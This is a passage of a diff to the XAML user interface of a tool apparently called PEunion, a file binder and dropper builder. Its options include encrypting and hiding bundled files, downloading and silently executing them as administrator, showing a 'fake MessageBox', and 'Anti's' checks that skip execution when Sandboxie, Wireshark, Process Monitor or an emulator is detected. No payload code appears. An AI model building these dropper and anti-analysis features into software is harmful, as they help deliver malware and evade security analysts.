+											<TextBox Grid.Column="2" Text="{Binding SelectedProjectItem.Title, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" Margin="0,0,0,5" />
+											<TextBox Grid.Row="1" Grid.Column="2" Text="{Binding SelectedProjectItem.Text, UpdateSourceTrigger=PropertyChanged}" AcceptsReturn="True" Height="100" ScrollViewer.HorizontalScrollBarVisibility="Auto" ScrollViewer.VerticalScrollBarVisibility="Visible" Style="{StaticResource UITextBox}" Margin="0,0,0,5" />
+											<ComboBox Grid.Row="2" Grid.Column="2" ItemsSource="{x:Static local:Lookups.MessageBoxButtons}" SelectedValuePath="Key" DisplayMemberPath="Value" SelectedValue="{Binding SelectedProjectItem.Buttons}" Style="{StaticResource UIComboBox}" Margin="0,0,0,10" />
+											<StackPanel Grid.Row="3" Grid.Column="2" Orientation="Horizontal" Margin="0,0,0,10" api:MarginSetter.Margin="10">
+												<RadioButton Content="None" VerticalContentAlignment="Center" Margin="0,0,10,0" IsChecked="{Binding SelectedProjectItem.IsIconNone}" />
+												<RadioButton VerticalContentAlignment="Center" Margin="0,0,10,0" IsChecked="{Binding SelectedProjectItem.IsIconInformation}">
+													<StackPanel Orientation="Horizontal">
+														<Image Source="/PEunion;component/Resources/ImageMessageBoxInformation.png" />
+														<TextBlock Text="Information" VerticalAlignment="Center" Margin="5,0,0,0" />
+													</StackPanel>
+												</RadioButton>
+												<RadioButton VerticalContentAlignment="Center" Margin="0,0,10,0" IsChecked="{Binding SelectedProjectItem.IsIconWarning}">
+													<StackPanel Orientation="Horizontal">
+														<Image Source="/PEunion;component/Resources/ImageMessageBoxWarning.png" />
+														<TextBlock Text="Warning" VerticalAlignment="Center" Margin="5,0,0,0" />
+													</StackPanel>
+												</RadioButton>
+												<RadioButton VerticalContentAlignment="Center" Margin="0,0,10,0" IsChecked="{Binding SelectedProjectItem.IsIconError}">
+													<StackPanel Orientation="Horizontal">
+														<Image Source="/PEunion;component/Resources/ImageMessageBoxError.png" />
+														<TextBlock Text="Error" VerticalAlignment="Center" Margin="5,0,0,0" />
+													</StackPanel>
+												</RadioButton>
+												<RadioButton VerticalContentAlignment="Center" Margin="0,0,10,0" IsChecked="{Binding SelectedProjectItem.IsIconConfirmation}">
+													<StackPanel Orientation="Horizontal">
+														<Image Source="/PEunion;component/Resources/ImageMessageBoxConfirmation.png" />
+														<TextBlock Text="Confirmation" VerticalAlignment="Center" Margin="5,0,0,0" />
+													</StackPanel>
+												</RadioButton>
+											</StackPanel>
+											<Button Grid.Row="4" Grid.Column="2" Content="Preview" Style="{StaticResource UIButton}" HorizontalAlignment="Left" Click="btnPreviewMessageBox_Click" />
+										</Grid>
 									</StackPanel>
-								</GroupBox>
-							</StackPanel>
-						</Grid>
-						<Grid Tag="Items" Style="{StaticResource TabGrid}">
-							<StackPanel>
-								<TextBlock Text="Items" Style="{StaticResource Title}" />
-								<TextBlock Text=" • Files and other items are processed in the order they appear on the right side" />
-								<TextBlock Text=" • From the context menu, items can be re-ordered or deleted" />
-								<Grid Margin="0,10,0,0">
-									<Grid.ColumnDefinitions>
-										<ColumnDefinition Width="*" />
-										<ColumnDefinition Width="10" />
-										<ColumnDefinition Width="*" />
-										<ColumnDefinition Width="10" />
-										<ColumnDefinition Width="*" />
-									</Grid.ColumnDefinitions>
-									<GroupBox Header="Add Files">
-										<StackPanel>
-											<local:FileBrowser Big="True" AllowMultiple="True" FilesSelect="ctrlAddFiles_FilesSelect" />
-										</StackPanel>
-									</GroupBox>
-									<GroupBox Grid.Column="2" Header="Add URL">
-										<StackPanel>
-											<TextBlock Text="Download a file from an URL:" Margin="0,0,0,10" />
-											<Button Content="Add URL" Style="{StaticResource UIButton}" HorizontalAlignment="Left" Click="btnAddUrl_Click" />
-										</StackPanel>
-									</GroupBox>
-									<GroupBox Grid.Column="4" Header="Add Message Box">
-										<StackPanel>
-											<TextBlock Text="Display a fake MessageBox:" Margin="0,0,0,10" />
-											<Button Content="Add Message Box" Style="{StaticResource UIButton}" HorizontalAlignment="Left" Click="btnAddMessageBox_Click" />
-										</StackPanel>
-									</GroupBox>
 								</Grid>
-							</StackPanel>
-						</Grid>
-						<Grid Tag="ProjectFile" Style="{StaticResource TabGrid}">
-							<StackPanel>
-								<TextBlock Text="{Binding SelectedProjectItem.Name}" Style="{StaticResource Title}" />
-								<TextBlock Margin="0,0,0,10">
-									<Hyperlink Click="mnuTreeFileOpenSourceDirectory_Click"><TextBlock><Run Text="{Binding SelectedProjectItem.SourceDirectory, Mode=OneWay}" /><Run Text="\" /></TextBlock></Hyperlink><Run Text="{Binding SelectedProjectItem.SourceFileName, Mode=OneWay}" />
-									<LineBreak />
-									<Run Text="Size:" />
-									<Run Text="{Binding SelectedProjectItem.SourceFileSize, Mode=OneWay}" />
-								</TextBlock>
-								<Grid>
-									<Grid.RowDefinitions>
-										<RowDefinition Height="Auto" />
-										<RowDefinition Height="Auto" />
-									</Grid.RowDefinitions>
-									<Grid.ColumnDefinitions>
-										<ColumnDefinition Width="*" />
-										<ColumnDefinition Width="10" />
-										<ColumnDefinition Width="*" />
-									</Grid.ColumnDefinitions>
-									<GroupBox Header="File Modification">
-										<StackPanel>
-											<CheckBox Content="Compress" IsChecked="{Binding SelectedProjectItem.Compress}" />
-											<CheckBox Content="Encrypt" IsChecked="{Binding SelectedProjectItem.Encrypt}" />
-											<CheckBox IsChecked="{Binding SelectedProjectItem.Hidden}">
-												<local:TextDisplay Text="Hidden" InfoIcon="Hide file by attributes Hidden|System" />
-											</CheckBox>
-										</StackPanel>
-									</GroupBox>
-									<GroupBox Grid.Column="2" Header="Dropping">
-										<StackPanel>
-											<TextBlock Text="File Name:" Margin="0,0,0,5" />
-											<TextBox Text="{Binding SelectedProjectItem.Name, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" Margin="0,0,0,10" />
-											<TextBlock Text="Location:" Margin="0,0,0,5" />
-											<ComboBox ItemsSource="{x:Static local:Lookups.DropLocations}" SelectedValuePath="Key" DisplayMemberPath="Value" SelectedValue="{Binding SelectedProjectItem.DropLocation}" Style="{StaticResource UIComboBox}" />
-										</StackPanel>
-									</GroupBox>
-									<GroupBox Grid.Row="1" Header="Execution">
-										<StackPanel>
-											<CheckBox Content="Execute" IsChecked="{Binding SelectedProjectItem.Execute}" />
-											<CheckBox IsChecked="{Binding SelectedProjectItem.Runas}" IsEnabled="{Binding SelectedProjectItem.Execute}">
-												<local:TextDisplay Text="Run as Administrator" InfoIcon="Execute with 'runas' verb (will trigger the UAC dialog)" />
-											</CheckBox>
-											<CheckBox Content="Wait for exit" IsChecked="{Binding SelectedProjectItem.ExecuteWait}" IsEnabled="{Binding SelectedProjectItem.CanExecuteWait, Mode=OneWay}" />
-											<CheckBox Content="Delete" IsChecked="{Binding SelectedProjectItem.ExecuteDelete}" IsEnabled="{Binding SelectedProjectItem.CanExecuteDelete, Mode=OneWay}" />
-											<TextBlock Text="Command Line:" Margin="0,5" />
-											<TextBox Text="{Binding SelectedProjectItem.CommandLine, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" />
-										</StackPanel>
-									</GroupBox>
-									<GroupBox Grid.Row="1" Grid.Column="2">
-										<GroupBox.Header>
-											<local:TextDisplay Text="Anti's" InfoIcon="File will not be processed if any of the following is detected" />
-										</GroupBox.Header>
-										<StackPanel>
-											<CheckBox IsChecked="{Binding SelectedProjectItem.AntiSandboxie}">
-												<local:TextDisplay Text="Sandboxie" InfoIcon="Process is running in Sandboxie (SbieDll.dll module loaded)" />
-											</CheckBox>
-											<CheckBox IsChecked="{Binding SelectedProjectItem.AntiWireshark}">
-												<local:TextDisplay Text="Wireshark" InfoIcon="Wireshark is running" />
-											</CheckBox>
-											<CheckBox IsChecked="{Binding SelectedProjectItem.AntiProcessMonitor}">
-												<local:TextDisplay Text="Process Monitor" InfoIcon="Process Monitor is running" />
-											</CheckBox>
-											<CheckBox IsChecked="{Binding SelectedProjectItem.AntiEmulator}">
-												<local:TextDisplay Text="Emulator" InfoIcon="Generic emulator test (takes 500 ms)" />
-											</CheckBox>
-										</StackPanel>
-									</GroupBox>
-								</Grid>
-							</StackPanel>
-						</Grid>
-						<Grid Tag="ProjectUrl" Style="{StaticResource TabGrid}">
-							<StackPanel>
-								<TextBlock Text="URL Download" Style="{StaticResource Title}" />
-								<Grid>
-									<Grid.RowDefinitions>
-										<RowDefinition Height="Auto" />
-										<RowDefinition Height="Auto" />
-										<RowDefinition Height="Auto" />
-									</Grid.RowDefinitions>
-									<Grid.ColumnDefinitions>
-										<ColumnDefinition Width="*" />
-										<ColumnDefinition Width="10" />
-										<ColumnDefinition Width="*" />
-									</Grid.ColumnDefinitions>
-									<GroupBox Grid.ColumnSpan="3" Header="Download URL">
-										<StackPanel>
-											<TextBox Text="{Binding SelectedProjectItem.Url, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" />
-										</StackPanel>
-									</GroupBox>
-									<GroupBox Grid.Row="1" Header="File Modification">
-										<StackPanel>
-											<CheckBox IsChecked="{Binding SelectedProjectItem.Hidden}">
-												<local:TextDisplay Text="Hidden" InfoIcon="Hide file by attributes Hidden|System" />
-											</CheckBox>
-										</StackPanel>
-									</GroupBox>
-									<GroupBox Grid.Row="1" Grid.Column="2" Header="Dropping">
-										<StackPanel>
-											<TextBlock Text="File Name:" Margin="0,0,0,5" />
-											<TextBox Text="{Binding SelectedProjectItem.Name, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" Margin="0,0,0,10" />
-											<TextBlock Text="Location:" Margin="0,0,0,5" />
-											<ComboBox ItemsSource="{x:Static local:Lookups.DropLocations}" SelectedValuePath="Key" DisplayMemberPath="Value" SelectedValue="{Binding SelectedProjectItem.DropLocation}" Style="{StaticResource UIComboBox}" />
-										</StackPanel>
-									</GroupBox>
-									<GroupBox Grid.Row="2" Header="Execution">
-										<StackPanel>
-											<CheckBox Content="Execute" IsChecked="{Binding SelectedProjectItem.Execute}" />
-											<CheckBox IsChecked="{Binding SelectedProjectItem.Runas}" IsEnabled="{Binding SelectedProjectItem.Execute}">
-												<local:TextDisplay Text="Run as Administrator" InfoIcon="Execute with 'runas' verb (will trigger the UAC dialog)" />
-											</CheckBox>
-											<CheckBox Content="Wait for exit" IsChecked="{Binding SelectedProjectItem.ExecuteWait}" IsEnabled="{Binding SelectedProjectItem.CanExecuteWait, Mode=OneWay}" />
-											<CheckBox Content="Delete" IsChecked="{Binding SelectedProjectItem.ExecuteDelete}" IsEnabled="{Binding SelectedProjectItem.CanExecuteDelete, Mode=OneWay}" />
-											<TextBlock Text="Command Line:" Margin="0,5" />
-											<TextBox Text="{Binding SelectedProjectItem.CommandLine, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" />
-										</StackPanel>
-									</GroupBox>
-									<GroupBox Grid.Row="2" Grid.Column="2">
-										<GroupBox.Header>
-											<local:TextDisplay Text="Anti's" InfoIcon="File will not be processed if any of the following is detected" />
-										</GroupBox.Header>
-										<StackPanel>
-											<CheckBox IsChecked="{Binding SelectedProjectItem.AntiSandboxie}">
-												<local:TextDisplay Text="Sandboxie" InfoIcon="Process is running in Sandboxie (SbieDll.dll module loaded)" />
-											</CheckBox>
-											<CheckBox IsChecked="{Binding SelectedProjectItem.AntiWireshark}">
-												<local:TextDisplay Text="Wireshark" InfoIcon="Wireshark is running" />
-											</CheckBox>
-											<CheckBox IsChecked="{Binding SelectedProjectItem.AntiProcessMonitor}">
-												<local:TextDisplay Text="Process Monitor" InfoIcon="Process Monitor is running" />
-											</CheckBox>
-											<CheckBox IsChecked="{Binding SelectedProjectItem.AntiEmulator}">
-												<local:TextDisplay Text="Emulator" InfoIcon="Generic emulator test (takes 500 ms)" />
-											</CheckBox>
-										</StackPanel>
-									</GroupBox>
-								</Grid>
-							</StackPanel>
-						</Grid>
-						<Grid Tag="ProjectMessageBox" Style="{StaticResource TabGrid}">
-							<StackPanel>
-								<TextBlock Text="Message Box" Style="{StaticResource Title}" />
-								<Grid>
-									<Grid.RowDefinitions>
-										<RowDefinition Height="Auto" />
-										<RowDefinition Height="Auto" />
-										<RowDefinition Height="Auto" />
-										<RowDefinition Height="Auto" />
-										<RowDefinition Height="Auto" />
-									</Grid.RowDefinitions>
-									<Grid.ColumnDefinitions>
-										<ColumnDefinition Width="Auto" />
-										<ColumnDefinition Width="10" />
-										<ColumnDefinition Width="*" />
-									</Grid.ColumnDefinitions>
-									<TextBlock Text="Title" Margin="0,5,0,0" />
-									<TextBlock Grid.Row="1" Text="Text" Margin="0,5,0,0" />
-									<TextBlock Grid.Row="2" Text="Buttons" Margin="0,5,0,0" />
-									<TextBlock Grid.Row="3" Text="Icon" Margin="0,5,0,0" />
-									<TextBox Grid.Column="2" Text="{Binding SelectedProjectItem.Title, UpdateSourceTrigger=PropertyChanged}" Style="{StaticResource UITextBox}" Margin="0,0,0,5" />
-									<TextBox Grid.Row="1" Grid.Column="2" Text="{Binding SelectedProjectItem.Text, UpdateSourceTrigger=PropertyChanged}" AcceptsReturn="True" Height="100" ScrollViewer.HorizontalScrollBarVisibility="Auto" ScrollViewer.VerticalScrollBarVisibility="Visible" Style="{StaticResource UITextBox}" Margin="0,0,0,5" />
-									<ComboBox Grid.Row="2" Grid.Column="2" ItemsSource="{x:Static local:Lookups.MessageBoxButtons}" SelectedValuePath="Key" DisplayMemberPath="Value" SelectedValue="{Binding SelectedProjectItem.Buttons}" Style="{StaticResource UIComboBox}" Margin="0,0,0,10" />
-									<StackPanel Grid.Row="3" Grid.Column="2" Orientation="Horizontal" Margin="0,0,0,10" api:MarginSetter.Margin="10">
-										<RadioButton Content="None" VerticalContentAlignment="Center" Margin="0,0,10,0" IsChecked="{Binding SelectedProjectItem.IsIconNone}" />
-										<RadioButton VerticalContentAlignment="Center" Margin="0,0,10,0" IsChecked="{Binding SelectedProjectItem.IsIconInformation}">
-											<StackPanel Orientation="Horizontal">
-												<Image Source="/PEunion;component/Resources/ImageMessageBoxInformation.png" />
-												<TextBlock Text="Information" VerticalAlignment="Center" Margin="5,0,0,0" />
-											</StackPanel>
-										</RadioButton>
-										<RadioButton VerticalContentAlignment="Center" Margin="0,0,10,0" IsChecked="{Binding SelectedProjectItem.IsIconWarning}">
-											<StackPanel Orientation="Horizontal">
-												<Image Source="/PEunion;component/Resources/ImageMessageBoxWarning.png" />
-												<TextBlock Text="Warning" VerticalAlignment="Center" Margin="5,0,0,0" />
-											</StackPanel>
-										</RadioButton>
-										<RadioButton VerticalContentAlignment="Center" Margin="0,0,10,0" IsChecked="{Binding SelectedProjectItem.IsIconError}">
-											<StackPanel Orientation="Horizontal">
-												<Image Source="/PEunion;component/Resources/ImageMessageBoxError.png" />
-												<TextBlock Text="Error" VerticalAlignment="Center" Margin="5,0,0,0" />
-											</StackPanel>
-										</RadioButton>
-										<RadioButton VerticalContentAlignment="Center" Margin="0,0,10,0" IsChecked="{Binding SelectedProjectItem.IsIconConfirmation}">
-											<StackPanel Orientation="Horizontal">
-												<Image Source="/PEunion;component/Resources/ImageMessageBoxConfirmation.png" />
-												<TextBlock Text="Confirmation" VerticalAlignment="Center" Margin="5,0,0,0" />
-											</StackPanel>
-										</RadioButton>
-									</StackPanel>
-									<Button Grid.Row="4" Grid.Column="2" Content="Preview" Style="{StaticResource UIButton}" HorizontalAlignment="Left" Click="btnPreviewMessageBox_Click" />
-								</Grid>
-							</StackPanel>
-						</Grid>
+							</Grid>
+						</ScrollViewer>
 					</Grid>
-				</ScrollViewer>
-			</Grid>
+				</TabItem>
+			</TabControl>
 			<GridSplitter Grid.Row="1" ResizeDirection="Rows" ResizeBehavior="PreviousAndNext" HorizontalAlignment="Stretch" VerticalAlignment="Stretch" />
 			<GroupBox Grid.Row="2" Header="Errors" Style="{StaticResource DockPanel}">
 				<DockPanel>
